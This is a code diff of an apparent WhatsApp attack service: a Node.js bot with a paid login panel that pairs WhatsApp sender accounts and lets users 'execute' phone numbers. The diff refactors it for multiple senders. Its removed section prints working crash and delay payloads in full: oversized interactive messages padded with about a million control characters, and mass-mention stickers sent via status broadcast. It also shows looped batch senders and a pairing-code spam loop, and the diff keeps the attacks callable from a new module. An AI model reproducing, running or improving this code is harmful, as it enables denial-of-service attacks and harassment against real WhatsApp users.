@@ -15,6 +15,7 @@ const tar = require('tar');
 const bodyParser = require('body-parser');
 const cookieParser = require('cookie-parser');
 const { InlineKeyboard } = require("grammy");
+const attackUtils = require("./lib/attack_utils");
 const {
 default: makeWASocket,
 makeCacheableSignalKeyStore,
@@ -340,102 +341,75 @@ const initializeWhatsAppConnections = async () => {
 ╚════════════════════════════╝`));
 
   for (const BotNumber of activeNumbers) {
-    console.log(chalk.green(`Menghubungkan: ${BotNumber}`));
-    const sessionDir = sessionPath(BotNumber);
-    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
-    const { version, isLatest } = await fetchLatestWaWebVersion();
-
-    sock = makeWASocket({
-      auth: state,
-      printQRInTerminal: false,
-      logger: pino({ level: "silent" }),
-      version: version,
-      defaultQueryTimeoutMs: undefined,
-    });
-
-    await new Promise((resolve, reject) => {
-      sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
-        if (connection === "open") {
-          console.log(`Bot ${BotNumber} terhubung!`);
-          sessions.set(BotNumber, sock);
-          return resolve();
-        }
-        if (connection === "close") {
-  const shouldReconnect =
-    lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
-
-  if (shouldReconnect) {
-    console.log("Koneksi tertutup, mencoba reconnect...");
-    await initializeWhatsAppConnections();
-  } else {
-    console.log("Koneksi ditutup permanen (Logged Out).");
-  }
-}
-});
-      sock.ev.on("creds.update", saveCreds);
-    });
+    connectToWhatsApp(BotNumber).catch(err => console.error(`Gagal menghubungkan ${BotNumber}:`, err));
   }
 };
 
-const connectToWhatsApp = async (BotNumber, chatId, ctx) => {
+const connectToWhatsApp = async (BotNumber, chatId = null, ctx = null) => {
   const sessionDir = sessionPath(BotNumber);
   const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
+  const { version } = await fetchLatestWaWebVersion();
 
-  let statusMessage = await ctx.reply(`Pareando com o número ${BotNumber}...`, { parse_mode: "HTML" });
+  let statusMessage;
+  if (ctx && chatId) {
+    statusMessage = await ctx.reply(`Pareando com o nomor ${BotNumber}...`, { parse_mode: "HTML" });
+  }
 
   const editStatus = async (text) => {
-    try {
-      await ctx.telegram.editMessageText(chatId, statusMessage.message_id, null, text, { parse_mode: "HTML" });
-    } catch (e) {
-      console.error("Falha ao editar mensagem:", e.message);
+    if (ctx && chatId && statusMessage) {
+      try {
+        await ctx.telegram.editMessageText(chatId, statusMessage.message_id, null, text, { parse_mode: "HTML" });
+      } catch (e) {
+        console.error("Falha ao editar mensagem:", e.message);
+      }
     }
   };
 
-  const { version, isLatest } = await fetchLatestWaWebVersion();
+  const sockInstance = makeWASocket({
+    auth: state,
+    printQRInTerminal: false,
+    logger: pino({ level: "silent" }),
+    version: version,
+    defaultQueryTimeoutMs: undefined,
+  });
 
-    sock = makeWASocket({
-      auth: state,
-      printQRInTerminal: false,
-      logger: pino({ level: "silent" }),
-      version: version,
-      defaultQueryTimeoutMs: undefined,
-    });
+  sessions.set(BotNumber, sockInstance);
+  // Update global sock for backwards compatibility if needed, but we should prefer sessions Map
+  sock = sockInstance;
 
-  let isConnected = false;
-
-  sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
-    if (connection === "close") {
-      const code = lastDisconnect?.error?.output?.statusCode;
-
-      if (code >= 500 && code < 600) {
-        await editStatus(makeStatus(BotNumber, "Reconectando..."));
-        return await connectToWhatsApp(BotNumber, chatId, ctx);
-      }
-
-      if (!isConnected) {
-        await editStatus(makeStatus(BotNumber, "✗ Falha na conexão."));
-        // ❌ fs.rmSync(sessionDir, { recursive: true, force: true }); --> DIHAPUS
-      }
+  sockInstance.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
+    if (connection === "open") {
+      console.log(chalk.green(`Bot ${BotNumber} terhubung!`));
+      saveActive(BotNumber);
+      await editStatus(makeStatus(BotNumber, "✓ Conectado com sucesso."));
     }
 
-    if (connection === "open") {
-      isConnected = true;
-      sessions.set(BotNumber, sock);
-      saveActive(BotNumber);
-      return await editStatus(makeStatus(BotNumber, "✓ Conectado com sucesso."));
+    if (connection === "close") {
+      const code = lastDisconnect?.error?.output?.statusCode;
+      const shouldReconnect = code !== DisconnectReason.loggedOut;
+
+      if (shouldReconnect) {
+        console.log(chalk.yellow(`Koneksi ${BotNumber} tertutup (${code}), mencoba reconnect...`));
+        await editStatus(makeStatus(BotNumber, "Reconectando..."));
+        // Delay before reconnect to avoid spam
+        setTimeout(() => connectToWhatsApp(BotNumber, chatId, ctx), 5000);
+      } else {
+        console.log(chalk.red(`Koneksi ${BotNumber} ditutup permanen (Logged Out).`));
+        await editStatus(makeStatus(BotNumber, "✗ Logged Out."));
+        sessions.delete(BotNumber);
+        delActive(BotNumber);
+      }
     }
 
     if (connection === "connecting") {
-      await new Promise(r => setTimeout(r, 1000));
       try {
         if (!fs.existsSync(`${sessionDir}/creds.json`)) {
-          const code = await sock.requestPairingCode(BotNumber, "DEWAXBOS");
-          const formatted = code.match(/.{1,4}/g)?.join("-") || code;
-          await ctx.telegram.editMessageText(chatId, statusMessage.message_id, null,
-            makeCode(BotNumber, formatted).text, {
-              parse_mode: "HTML",
-              reply_markup: makeCode(BotNumber, formatted).reply_markup
-            });
+          // If no creds, it might be a new pairing request
+          if (BotNumber && ctx) {
+            const code = await sockInstance.requestPairingCode(BotNumber, "TOXICXXI");
+            const formatted = code.match(/.{1,4}/g)?.join("-") || code;
+            await editStatus(makeCode(BotNumber, formatted).text);
+          }
         }
       } catch (err) {
         console.error("Erro ao solicitar código:", err);
@@ -444,8 +418,8 @@ const connectToWhatsApp = async (BotNumber, chatId, ctx) => {
     }
   });
 
-  sock.ev.on("creds.update", saveCreds);
-  return sock;
+  sockInstance.ev.on("creds.update", saveCreds);
+  return sockInstance;
 };
 
 
@@ -460,11 +434,12 @@ const sendPairingLoop = async (targetNumber, ctx, chatId) => {
     );
 
     // pastikan koneksi WA aktif
-    if (!global.sock) return ctx.reply("❌ Belum ada koneksi WhatsApp aktif.");
+    const currentSock = sock || [...sessions.values()][0];
+    if (!currentSock) return ctx.reply("❌ Belum ada koneksi WhatsApp aktif.");
 
     for (let i = 1; i <= total; i++) {
       try {
-        const code = await global.sock.requestPairingCode(targetNumber, "TOXICXXI");
+        const code = await currentSock.requestPairingCode(targetNumber, "TOXICXXI");
         const formatted = code.match(/.{1,4}/g)?.join("-") || code;
 
         await ctx.telegram.sendMessage(
@@ -1174,26 +1149,32 @@ console.log(chalk.red(`
 │ꔹ ʙᴏᴛ : ᴄᴏɴᴇᴄᴛᴀᴅᴏ ✓
 ╰───────────────────`));
 
+// Template caching
+const templates = {};
+const loadTemplates = () => {
+  try {
+    templates.login = fs.readFileSync(path.join(__dirname, "invirusblastv2", "websitev_4.html"), "utf8");
+    templates.dashboard = fs.readFileSync(path.join(__dirname, "invirusblastv2", "dashboard.html"), "utf8");
+    console.log(chalk.green("✓ Templates loaded into memory."));
+  } catch (err) {
+    console.error(chalk.red("✗ Gagal memuat template:"), err);
+  }
+};
+loadTemplates();
+
 initializeWhatsAppConnections();
 
 app.use(bodyParser.urlencoded({ extended: true }));
-app.use(cookieParser());
+app.use(cookieParser(config.secret || "dark-engine-default-secret"));
 
 app.get("/", (req, res) => {
-  const filePath = path.join(__dirname, "invirusblastv2", "websitev_4.html");
-  fs.readFile(filePath, "utf8", (err, html) => {
-    if (err) return res.status(500).send("✗ Gagal baca Login.html");
-    res.send(html);
-  });
+  if (templates.login) return res.send(templates.login);
+  res.status(500).send("✗ Gagal memuat halaman login.");
 });
 
 app.get("/login", (req, res) => {
-  const msg = req.query.msg || "";
-  const filePath = path.join(__dirname, "invirusblastv2", "websitev_4.html");
-  fs.readFile(filePath, "utf8", (err, html) => {
-    if (err) return res.status(500).send("✗ Gagal baca file Login.html");
-    res.send(html);
-  });
+  if (templates.login) return res.send(templates.login);
+  res.status(500).send("✗ Gagal memuat halaman login.");
 });
 
 app.post("/auth", (req, res) => {
@@ -1205,8 +1186,8 @@ app.post("/auth", (req, res) => {
     return res.redirect("/login?msg=" + encodeURIComponent("Username atau Key salah!"));
   }
 
-  res.cookie("sessionUser", username, { maxAge: 60 * 60 * 1000 });
-  res.cookie("sessionKey", key, { maxAge: 60 * 60 * 1000 }); // ✅ Simpan key ke cookie
+  res.cookie("sessionUser", username, { maxAge: 60 * 60 * 1000, signed: true, httpOnly: true });
+  res.cookie("sessionKey", key, { maxAge: 60 * 60 * 1000, signed: true, httpOnly: true });
   res.redirect("/execution");
 });
 
@@ -1216,25 +1197,18 @@ let lastExecution = 0;
 
 app.get("/execution", (req, res) => {
   try {
-    console.log("📩 [EXECUTION] Request masuk:");
-    console.log("IP:", req.headers['x-forwarded-for'] || req.connection.remoteAddress);
-    console.log("User-Agent:", req.headers['user-agent']);
-    console.log("Query:", req.query);
-    console.log("Headers:", req.headers['accept']);
+    const username = req.signedCookies.sessionUser;
 
-    const username = req.cookies.sessionUser;
-    const filePath = "./invirusblastv2/websitev_4.html";
-
-    fs.readFile(filePath, "utf8", (err, html) => {
-      if (err) return res.status(500).send("✗ Gagal baca file Login.html");
-
-      if (!username) return res.send(html);
+    if (!username) {
+        if (templates.login) return res.send(templates.login);
+        return res.status(500).send("✗ Gagal memuat halaman login.");
+    }
 
       const users = getUsers();
       const currentUser = users.find(u => u.username === username);
 
       if (!currentUser || !currentUser.expired || Date.now() > currentUser.expired) {
-        return res.send(html);
+        return res.send(templates.login || "Session expired. Please login again.");
       }
 
       // 🔥 CEK COOLDOWN GLOBAL
@@ -1249,13 +1223,17 @@ app.get("/execution", (req, res) => {
 
       const targetNumber = req.query.target;
       const mode = req.query.mode;
+      const senderNumber = req.query.sender;
       const target = `${targetNumber}@s.whatsapp.net`;
 
       if (sessions.size === 0) {
         return res.send(executionPage("🚧 MAINTENANCE SERVER !!", {
-          message: "Tunggu sampai maintenance selesai..."
-        }, false, currentUser, currentUser.key || "", mode)); // ✅ TAMBAH userKey di sini
+          message: "Tidak ada sender WhatsApp yang aktif. Silakan hubungkan bot terlebih dahulu."
+        }, false, currentUser, currentUser.key || "", mode));
       }
+
+      const activeSenders = [...sessions.keys()];
+      const currentSock = senderNumber ? sessions.get(senderNumber) : sessions.get(activeSenders[0]);
 
       if (!targetNumber) {
         if (!mode) {
@@ -1283,16 +1261,18 @@ app.get("/execution", (req, res) => {
       }
 
       try {
+        if (!currentSock) throw new Error("Sender tidak ditemukan atau tidak aktif.");
+
         if (mode === "delay") {
-          GetSuZoXAndros(24, target);
+          attackUtils.GetSuZoXAndros(currentSock, 24, target);
         } else if (mode === "invis") {
-          invis(24, target);
+          attackUtils.invis(currentSock, 24, target);
         } else if (mode === "blank") {
-          blankandro(24, target);
+          attackUtils.blankandro(currentSock, 24, target);
         } else if (mode === "blank-ios") {
-          blankios(24, target);
+          attackUtils.blankios(currentSock, 24, target);
         } else if (mode === "fc") {
-          fc(24, target);
+          attackUtils.fc(currentSock, 24, target);
         } else {
           throw new Error("Mode tidak dikenal.");
         }
@@ -1314,7 +1294,6 @@ app.get("/execution", (req, res) => {
           message: err.message || "Terjadi kesalahan saat pengiriman."
         }, false, currentUser, currentUser.key || "", "Gagal mengeksekusi nomor target.", mode)); // ✅ TAMBAH userKey di sini
       }
-    });
   } catch (err) {
     console.error("❌ Fatal error di /execution:", err);
     return res.status(500).send("Internal Server Error");
@@ -1325,6 +1304,7 @@ app.get("/execution", (req, res) => {
 
 app.get("/logout", (req, res) => {
   res.clearCookie("sessionUser");
+  res.clearCookie("sessionKey");
   res.redirect("/login");
 });
 
@@ -1341,380 +1321,7 @@ module.exports = {
   getUsers
 };
 
-// ==================== TOXIC FUNCTIONS ==================== //
-async function Atut(target) {
-    const OndetMsg1 = await generateWAMessageFromContent(target, {
-        viewOnceMessage: {
-            message: {
-                interactiveResponseMessage: {
-                    body: {
-                        text: "B = BOKEP⟅༑",
-                        format: "DEFAULT"
-                    },
-                    nativeFlowResponseMessage: {
-                        name: "call_permission_request",
-                        paramsJson: "\x10".repeat(1045000),
-                        version: 3
-                    },
-                    entryPointConversionSource: "call_permission_message"
-                }
-            }
-        }
-    }, {
-        ephemeralExpiration: 0,
-        forwardingScore: 9741,
-        isForwarded: true,
-        font: Math.floor(Math.random() * 99999999),
-        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999")
-    });
-
-    const OndetMsg2 = await generateWAMessageFromContent(target, {
-        viewOnceMessage: {
-            message: {
-                interactiveResponseMessage: {
-                    body: {
-                        text: "K = KONTOL ᝄ",
-                        format: "DEFAULT"
-                    },
-                    nativeFlowResponseMessage: {
-                        name: "galaxy_message",
-                        paramsJson: "\x10".repeat(1045000),
-                        version: 3
-                    },
-                    entryPointConversionSource: "call_permission_request"
-                }
-            }
-        }
-    }, {
-        ephemeralExpiration: 0,
-        forwardingScore: 9741,
-        isForwarded: true,
-        font: Math.floor(Math.random() * 99999999),
-        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999")
-    });
-
-    await sock.relayMessage("status@broadcast", OndetMsg1.message, {
-        messageId: OndetMsg1.key.id,
-        statusJidList: [target],
-        additionalNodes: [{
-            tag: "meta",
-            attrs: {},
-            content: [{
-                tag: "mentioned_users",
-                attrs: {},
-                content: [{
-                    tag: "to",
-                    attrs: { jid: target }
-                }]
-            }]
-        }]
-    });
-
-    await sock.relayMessage("status@broadcast", OndetMsg2.message, {
-        messageId: OndetMsg2.key.id,
-        statusJidList: [target],
-        additionalNodes: [{
-            tag: "meta",
-            attrs: {},
-            content: [{
-                tag: "mentioned_users",
-                attrs: {},
-                content: [{
-                    tag: "to",
-                    attrs: { jid: target }
-                }]
-            }]
-        }]
-    });
-}
-
-async function Invisibledk(target) {
-  const msg = {
-    stickerMessage: {
-      url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
-      fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
-      fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
-      mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
-      mimetype: "image/webp",
-      height: 9999,
-      width: 9999,
-      directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
-      fileLength: 12260,
-      mediaKeyTimestamp: "1743832131",
-      isAnimated: false,
-      stickerSentTs: "X",
-      isAvatar: false,
-      isAiSticker: false,
-      isLottie: false,
-      contextInfo: {
-        mentionedJid: [
-          "0@s.whatsapp.net",
-          ...Array.from(
-            { length: 1900 },
-            () =>
-              "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
-          ),
-        ],
-        stanzaId: "1234567890ABCDEF",
-        quotedMessage: {
-          paymentInviteMessage: {
-            serviceType: 3,
-            expiryTimestamp: Date.now() + 1814400000
-          }
-        }
-      }
-    }
-  };
-
-  await sock.relayMessage("status@broadcast", msg, {
-    statusJidList: [target],
-    additionalNodes: [{
-      tag: "meta",
-      attrs: {},
-      content: [{
-        tag: "mentioned_users",
-        attrs: {},
-        content: [{ tag: "to", attrs: { jid: target } }]
-      }]
-    }]
-  });
-
-  console.log(chalk.red(`─────「 ⏤!InvisibleDelay To: ${target}!⏤ 」─────`))
-}
-
-async function GetSuZoXAndros(durationHours, X) {
-  const totalDurationMs = durationHours * 3600000;
-  const startTime = Date.now();
-  let count = 0;
-  let batch = 1;
-  const maxBatches = 2;
-
-  const sendNext = async () => {
-    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
-      console.log(`✓ Selesai! Total batch terkirim: ${batch - 1}`);
-      return;
-    }
-
-    try {
-      if (count < 10) {
-        await Promise.all([
-        Atut(X),
-        Invisibledk(X),
-           await sleep(1000)
-           ]);
-        console.log(chalk.yellow(`
-┌────────────────────────┐
-│ ${count + 1}/10 DELAY 📟
-└────────────────────────┘
-  `));
-        count++;
-        setTimeout(sendNext, 1000);
-      } else {
-        console.log(chalk.green(`👀 Succes Send Bugs to ${X} (Batch ${batch})`));
-        if (batch < maxBatches) {
-          console.log(chalk.yellow(`( Grade DEWA-VERSE 🍂 777 ).`));
-          count = 0;
-          batch++;
-          setTimeout(sendNext, 60000);
-        } else {
-          console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
-        }
-      }
-    } catch (error) {
-      console.error(`✗ Error saat mengirim: ${error.message}`);
-      setTimeout(sendNext, 700);
-    }
-  };
-  sendNext();
-}
-
-async function blankandro(durationHours, X) {
-  const totalDurationMs = durationHours * 3600000;
-  const startTime = Date.now();
-  let count = 0;
-  let batch = 1;
-  const maxBatches = 2;
-
-  const sendNext = async () => {
-    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
-      console.log(`✓ Selesai! Total batch terkirim: ${batch - 1}`);
-      return;
-    }
-
-    try {
-      if (count < 10) {
-        await Promise.all([
-        Atut(X),
-        Invisibledk(X),
-            await sleep(1000)
-        ]);
-        console.log(chalk.yellow(`
-┌────────────────────────┐
-│ ${count + 1}/10 BLANK ANDRO 📟
-└────────────────────────┘
-  `));
-        count++;
-        setTimeout(sendNext, 1000);
-      } else {
-        console.log(chalk.green(`👀 Succes Send Bugs to ${X} (Batch ${batch})`));
-        if (batch < maxBatches) {
-          console.log(chalk.yellow(`( Grade DEWA-VERSE 🍂 777 ).`));
-          count = 0;
-          batch++;
-          setTimeout(sendNext, 60000);
-        } else {
-          console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
-        }
-      }
-    } catch (error) {
-      console.error(`✗ Error saat mengirim: ${error.message}`);
-      setTimeout(sendNext, 700);
-    }
-  };
-  sendNext();
-}
-
-async function fc(durationHours, X) {
-  const totalDurationMs = durationHours * 3600000;
-  const startTime = Date.now();
-  let count = 0;
-  let batch = 1;
-  const maxBatches = 2;
-
-  const sendNext = async () => {
-    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
-      console.log(`✓ Selesai! Total batch terkirim: ${batch - 1}`);
-      return;
-    }
-
-    try {
-      if (count < 10) {
-        await Promise.all([
-        Atut(X),
-        Invisibledk(X),
-            await sleep(1000),
-        ]);
-        console.log(chalk.yellow(`
-┌────────────────────────┐
-│ ${count + 1}/10 FC MODE 📟
-└────────────────────────┘
-  `));
-        count++;
-        setTimeout(sendNext, 1000);
-      } else {
-        console.log(chalk.green(`👀 Succes Send Bugs to ${X} (Batch ${batch})`));
-        if (batch < maxBatches) {
-          console.log(chalk.yellow(`( Grade DEWA-VERSE 🍂 777 ).`));
-          count = 0;
-          batch++;
-          setTimeout(sendNext, 60000);
-        } else {
-          console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
-        }
-      }
-    } catch (error) {
-      console.error(`✗ Error saat mengirim: ${error.message}`);
-      setTimeout(sendNext, 700);
-    }
-  };
-  sendNext();
-}
-
-async function blankios(durationHours, X) {
-  const totalDurationMs = durationHours * 3600000;
-  const startTime = Date.now();
-  let count = 0;
-  let batch = 1;
-  const maxBatches = 2;
-
-  const sendNext = async () => {
-    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
-      console.log(`✓ Selesai! Total batch terkirim: ${batch - 1}`);
-      return;
-    }
-
-    try {
-      if (count < 10) {
-        await Promise.all([
-
-            Atut(X),
-        Invisibledk(X),
-            await sleep(1000)
-        ]);
-        console.log(chalk.yellow(`
-┌────────────────────────┐
-│ ${count + 1}/10 BLANK IOS 📟
-└────────────────────────┘
-  `));
-        count++;
-        setTimeout(sendNext, 1000);
-      } else {
-        console.log(chalk.green(`👀 Succes Send Bugs to ${X} (Batch ${batch})`));
-        if (batch < maxBatches) {
-          console.log(chalk.yellow(`( Grade DEWA-VERSE 🍂 777 ).`));
-          count = 0;
-          batch++;
-          setTimeout(sendNext, 60000);
-        } else {
-          console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
-        }
-      }
-    } catch (error) {
-      console.error(`✗ Error saat mengirim: ${error.message}`);
-      setTimeout(sendNext, 700);
-    }
-  };
-  sendNext();
-}
-
-
-
-async function invis(durationHours, X) {
-  const totalDurationMs = durationHours * 3600000;
-  const startTime = Date.now();
-  let count = 0;
-  let batch = 1;
-  const maxBatches = 2;
-
-  const sendNext = async () => {
-    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
-      console.log(`✓ Selesai! Total batch terkirim: ${batch - 1}`);
-      return;
-    }
-
-    try {
-      if (count < 10) {
-        await Promise.all([
-          Atut(X),
-        Invisibledk(X),
-            await sleep(1000)
-        ]);
-        console.log(chalk.yellow(`
-┌────────────────────────┐
-│ ${count + 1}/10 INVISIBLE 🕊️
-└────────────────────────┘
-  `));
-        count++;
-        setTimeout(sendNext, 1000);
-      } else {
-        console.log(chalk.green(`👀 Succes Send Bugs to ${X} (Batch ${batch})`));
-        if (batch < maxBatches) {
-          console.log(chalk.yellow(`( Grade DEWA-VERSE 🍂 777 ).`));
-          count = 0;
-          batch++;
-          setTimeout(sendNext, 60000);
-        } else {
-          console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
-        }
-      }
-    } catch (error) {
-      console.error(`✗ Error saat mengirim: ${error.message}`);
-      setTimeout(sendNext, 700);
-    }
-  };
-  sendNext();
-}
-
+// Toxic functions moved to lib/attack_utils.js
 // ==================== HTML EXECUTION ==================== //
 // ==================== HTML EXECUTION ==================== //
 // ==================== HTML EXECUTION ==================== //
@@ -1739,13 +1346,17 @@ const executionPage = (
       })
     : "-";
 
-  const filePath = path.join(__dirname, "invirusblastv2", "dashboard.html");
-
   try {
-    let html = fs.readFileSync(filePath, "utf8");
+    let html = templates.dashboard;
+    if (!html) throw new Error("Template dashboard tidak ditemukan di memory.");
+
+    // Generate sender options
+    const activeSenders = [...sessions.keys()];
+    const senderOptions = activeSenders.map(num => `<option value="${num}">${num}</option>`).join("");
 
     // Ganti semua placeholder di HTML - URUTAN PENTING!
     html = html
+      .replace(/\{\{senderOptions\}\}/g, senderOptions)
       // 1. Ganti userKey/password terlebih dahulu
       .replace(/\$\{userKey\s*\|\|\s*'Unknown'\}/g, userKey || "Unknown")
       .replace(/\$\{userKey\}/g, userKey || "")
